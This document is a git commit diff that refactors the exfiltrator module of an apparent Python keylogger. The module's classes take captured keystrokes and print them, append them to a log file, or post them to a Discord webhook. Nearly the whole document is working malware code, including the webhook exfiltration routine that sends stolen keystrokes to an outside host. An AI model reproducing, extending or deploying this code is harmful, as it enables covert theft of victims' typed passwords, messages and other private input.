0b132cb8eb142dad19af04e7934f3c8f75deda1e
EONRaider <livewire_voodoo@protonmail.com>
2021-10-10 09:29:17 -0300

    Refactor Exfiltrator ABC
    - Renamed "subject" to "keylogger" and
    "host_name" to "tag" in Exfiltrator.__init__
    - Added the "tag" setter/getter pattern to
    consolidate the tagging of each exfiltrator
    without hard-coded names being involved
    - Added the "data" getter to re-evaluate the
    string representation of KeyLogger each time an
    exfiltrator calls "update"
    - Modified child-classes to conform to new
    interface and signatures

--- src/exfiltrators.py
+++ src/exfiltrators.py
@@ -8,7 +8,6 @@ import aiohttp
 import asyncio
 import logging
 from pathlib import Path
-from typing import Collection
 
 from discord import Webhook, AsyncWebhookAdapter
 
@@ -17,12 +16,26 @@ from keylogger import KeyLogger
 
 
 class Exfiltrator(abc.ABC):
-    def __init__(self, subject: KeyLogger, host_name: str):
-        subject.register_exfiltrator(exfiltrator=self)
-        self.host_name = f"Keylogger::{self.__class__.__name__}"
-        if host_name is not None:
-            self.host_name += f"::{host_name}"
-        self.logger = reporting.set_logger(name=self.host_name)
+    def __init__(self, keylogger: KeyLogger, tag: str):
+        self.keylogger = keylogger
+        self.keylogger.register_exfiltrator(exfiltrator=self)
+        self.tag = tag
+        self.logger = reporting.set_logger(name=self.tag)
+
+    @property
+    def tag(self) -> str:
+        return self._tag
+
+    @tag.setter
+    def tag(self, tag_name: str) -> None:
+        self._tag = f"{self.keylogger.__class__.__name__}::" \
+                    f"{self.__class__.__name__}"
+        if tag_name is not None:
+            self._tag += f"::{tag_name}"
+
+    @property
+    def data(self):
+        return str(self.keylogger)
 
     @abc.abstractmethod
     def update(self, *args, **kwargs):
@@ -30,48 +43,47 @@ class Exfiltrator(abc.ABC):
 
 
 class Screen(Exfiltrator):
-    def __init__(self, *, subject: KeyLogger, host_name: str = None):
-        super().__init__(subject, host_name)
+    def __init__(self, *, keylogger: KeyLogger, tag: str = None):
+        super().__init__(keylogger, tag)
 
-    def update(self, data: Collection[str]):
-        self.logger.info("".join(data) if len(data) > 0 else "<NO INPUT>")
+    def update(self):
+        self.logger.info(self.data if len(self.data) > 0 else "<NO INPUT>")
         print(reporting.get_logs())
 
 
 class TextFile(Exfiltrator):
     def __init__(self, *,
-                 subject: KeyLogger,
-                 host_name: str = None,
+                 keylogger: KeyLogger,
+                 tag: str = None,
                  file_path: [str, Path]):
-        super().__init__(subject, host_name)
+        super().__init__(keylogger, tag)
         self.file_path = file_path
 
-    def update(self, data: Collection[str]):
-        if len(data) > 0:
-            self.logger.info("".join(data))
+    def update(self):
+        if len(self.data) > 0:
+            self.logger.info(self.data)
             with open(file=self.file_path, mode="a", encoding="utf_8") as file:
                 file.write(reporting.get_logs())
 
 
 class Discord(Exfiltrator):
     def __init__(self, *,
-                 subject: KeyLogger,
-                 host_name: str = None,
+                 keylogger: KeyLogger,
+                 tag: str = None,
                  webhook_url: str):
-        super().__init__(subject, host_name)
+        super().__init__(keylogger, tag)
         self.webhook_url = webhook_url
         # Prevent asyncio and webhook from spamming the logs
         for logger in "asyncio", "discord.webhook":
             logging.getLogger(logger).setLevel(logging.CRITICAL)
 
-    def update(self, data: Collection[str]) -> None:
-        if len(data) > 0:
-            self.logger.info("".join(data))
+    def update(self) -> None:
+        if len(self.data) > 0:
+            self.logger.info(self.data)
             asyncio.run(self.send_message())
 
     async def send_message(self) -> None:
         async with aiohttp.ClientSession() as session:
             webhook = Webhook.from_url(url=self.webhook_url,
                                        adapter=AsyncWebhookAdapter(session))
-            await webhook.send(content=reporting.get_logs(),
-                               username=self.host_name)
+            await webhook.send(content=reporting.get_logs(), username=self.tag)
